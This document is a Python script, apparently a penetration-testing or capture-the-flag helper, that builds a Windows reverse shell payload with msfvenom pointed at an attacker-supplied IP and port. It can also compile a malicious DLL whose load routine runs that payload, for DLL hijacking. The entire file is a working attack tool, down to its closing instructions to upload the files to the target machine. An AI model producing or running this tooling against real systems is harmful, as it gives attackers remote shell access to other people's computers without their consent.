#!/usr/bin/env python3

import os
import sys
import subprocess
import argparse
import re
import time

DLL_CODE_FILE_NAME = "evildll.c"

DLL_CODE_TEMPLATE = """
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("#REVERSE_EXE_PATH#");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
"""

# Function to get the IP address of tun0 interface
def get_tun0_ip():
    try:
        ip = subprocess.check_output("ip addr show tun0", shell=True).decode()
        match = re.search(r"inet\s(\d+\.\d+\.\d+\.\d+)", ip)
        if match:
            return match.group(1)
        else:
            return None
    except Exception as e:
        print(f"Error getting tun0 IP address: {e}")
        return None

# Main function to start the server and print usage info
def main():
    parser = argparse.ArgumentParser(description="Reverse shell generator for Windows")
    parser.add_argument('--ip', type=str, help="IP address of the server (if omitted, attempts to use tun0 IP address or fallback)")
    parser.add_argument('--port', type=int, help="Port number to listen on (if omitted, uses 443)")
    
    # optionally allow requesting to generate DLL that will run reverse.exe
    parser.add_argument('--dll', type=str, help="Compile a DLL that will execute the specified reverse shell EXE at the given target path, e.g., --dll C:\\Users\\reverse.exe")

    args = parser.parse_args()
    
    port = args.port if args.port else 443
    ip = args.ip if args.ip else get_tun0_ip()

    exe_file_name = f"reverse-{port}.exe"
    dll_compiled_file_name = f"evildll-{port}.dll"
    dll_compile_command = f"x86_64-w64-mingw32-gcc {DLL_CODE_FILE_NAME} --shared -o {dll_compiled_file_name}"

    if not ip:
        print(f"Error: Could not get IP address for tun0 interface. Please specify an IP address manually.")
        sys.exit(1)

    print(f"Reverse shell listener will be: {ip}:{port}.")

    # get a timestamp (epoch) and create a /tmp/reverse-<timestamp> directory
    timestamp = int(time.time())
    directory = f"/tmp/reverse-{timestamp}"
    print(f"Creating directory: {directory}")
    os.makedirs(directory, exist_ok=True)

    # switch to the directory
    os.chdir(directory)
    print(f"Switching to directory: {directory}")

    # generate a reverse shell payload using msfvenom
    msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > {exe_file_name}"
    print(f"Generating payload using msfvenom:\n\t{msfvenom_command}")
    payload = subprocess.check_output(msfvenom_command, shell=True).decode()
    print(payload)

    # if DLL generation was requested, generate the DLL code
    if args.dll:
        # ensure the path ends with \
        if not args.dll.endswith("\\"):
            args.dll = args.dll + "\\"

        # add the exe file name to the dll target path
        args.dll = args.dll + exe_file_name

        # escape the target path for the DLL code template
        target_path = args.dll.replace("\\", "\\\\")

        # replace #REVERSE_EXE_PATH# in the DLL code template with the given target path
        print(f"Generating DLL code that will execute the {exe_file_name} at path {args.dll}")
        dll_code = DLL_CODE_TEMPLATE.replace("#REVERSE_EXE_PATH#", target_path)
        with(open(DLL_CODE_FILE_NAME, "w")) as f:
            f.write(dll_code)
        print(f"DLL code written to {DLL_CODE_FILE_NAME}")

        # compile the DLL
        print(f"Compiling DLL code...\n\t{dll_compile_command}")
        result = subprocess.run(dll_compile_command, shell=True, capture_output=True)
        # check return code
        if result.returncode != 0:
            print(f"Error compiling DLL: {result.stderr.decode()}")
            sys.exit(1)
        print(f"DLL compiled to {dll_compiled_file_name}")

    print(f"\nDone.")
    print(f"Generated files:")
    print(f"  - {os.path.join(directory, exe_file_name)}")
    if (args.dll):
        print(f"  - {os.path.join(directory, DLL_CODE_FILE_NAME)}")
        print(f"  - {os.path.join(directory, dll_compiled_file_name)}")
        print(f"\nUpload {exe_file_name} to the target machine and place it at {args.dll}.")
        print(f"Upload {dll_compiled_file_name} to the target machine and use it so that it runs.")
    else:
        print(f"\nUpload {exe_file_name} to the target machine and use it so that it runs.")

if __name__ == "__main__":
    main()


